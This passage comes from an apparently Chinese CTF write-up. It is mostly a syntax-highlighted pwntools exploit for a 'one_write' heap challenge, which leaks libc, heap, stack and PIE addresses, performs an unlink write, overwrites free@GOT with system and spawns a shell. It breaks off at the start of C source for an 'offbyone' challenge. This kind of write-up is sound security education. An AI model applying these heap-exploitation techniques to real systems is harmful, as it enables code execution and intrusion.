shell</span><br><span style="color:#393A34">free_got </span><span style="color:#999999">=</span><span style="color:#393A34"> pie_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4000</span><br><span style="color:#393A34">system </span><span style="color:#999999">=</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"system => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a13865">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#a13865">]</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#393A34">flat</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">18</span><span style="color:#999999">,</span><span style="color:#393A34"> free_got</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#393A34">flat</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#393A34">system</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">free</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./one_write_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">info</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">        dir ~/CTFhub/Problems/Pwn/glibc/malloc</span><br><span style="color:#C98A7D">        b* _int_free_merge_chunk+144</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">id</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#B8A965">id</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> alloc</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> size</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">idx: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">size: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">size</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> free</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">idx: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">data: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> show</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">410</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">410</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">50</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># leak libc and heap address</span><br><span style="color:#DBD7CAEE">free</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">show</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">420</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">203f10</span><br><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">heap_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"heap_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">heap_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># leak __libc_argv to get stack addr</span><br><span style="color:#DBD7CAEE">free</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">free</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">free</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">environ </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">2046e0</span><br><span style="color:#DBD7CAEE">target </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">environ </span><span style="color:#CB7676">^</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">heap_addr </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 12</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">410</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">31</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">target</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">51</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">52</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">free</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">show</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">420</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">u64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">8</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> ^</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">heap_addr </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 12</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> ^</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">environ </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 12</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"stack_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># leak pie base via stack</span><br><span style="color:#DBD7CAEE">target </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">48</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> ^</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">heap_addr </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 12</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">410</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">31</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> target</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">53</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">54</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">free</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">show</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">420</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">pie_addr </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">u64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">8</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> ^</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">heap_addr </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 12</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> ^</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 12</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10b0</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"pie_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">pie_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># write the_chunk by unlink</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">55</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">alloc</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">56</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">350</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">the_chunk </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4080</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">411</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> the_chunk </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">18</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> the_chunk </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">3f0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">410</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">420</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">free</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># hijack free@got to system and get shell</span><br><span style="color:#DBD7CAEE">free_got </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4000</span><br><span style="color:#DBD7CAEE">system </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"system => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#d9739f">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#d9739f">]</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flat</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">18</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> free_got</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flat</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">system</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">free</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="offbyone" class="scroll-target"><a href="#offbyone"><code class="hash inline-code">#</code>offbyone</a></h2>
<p>神秘题目。</p>
<p>给了源码：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdio.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdlib.h</span><span style="color:#B5695977">></span><br><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> N</span><span style="color:#2F798A"> 10000</span><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> BINS</span><span style="color:#2F798A"> 10</span><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> compare</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">const</span><span style="color:#AB5959"> void</span><span style="color:#AB5959"> *</span><span style="color:#B07D48">a</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> void</span><span style="color:#AB5959"> *</span><span style="color:#B07D48">b</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><span style="color:#1E754F"> return</span><span style="color:#AB5959"> *</span><span style="color:#1e754f">(</span><span style="color:#AB5959">float*</span><span style="color:#1e754f">)</span><span style="color:#393A34">a </span><span style="color:#AB5959">==</span><span style="color:#AB5959"> *</span><span style="color:#1e754f">(</span><span style="color:#AB5959">float*</span><span style="color:#1e754f">)</span><span style="color:#393A34">b </span><span style="color:#AB5959">?</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959"> :</span><span style="color:#AB5959"> *</span><span style="color:#1e754f">(</span><span style="color:#AB5959">float*</span><span style="color:#1e754f">)</span><span style="color:#393A34">a </span><span style="color:#AB5959">></span><span style="color:#AB5959"> *</span><span style="color:#1e754f">(</span><span style="color:#AB5959">float*</span><span style="color:#1e754f">)</span><span style="color:#393A34">b </span><span style="color:#AB5959">?</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959"> :</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#999999">;</span><span style="color:#999999"> </span><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">void</span><span style="color:#59873A"> vuln</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">	float</span><span style="color:#B07D48"> data</span><span style="color:#1e754f">[</span><span 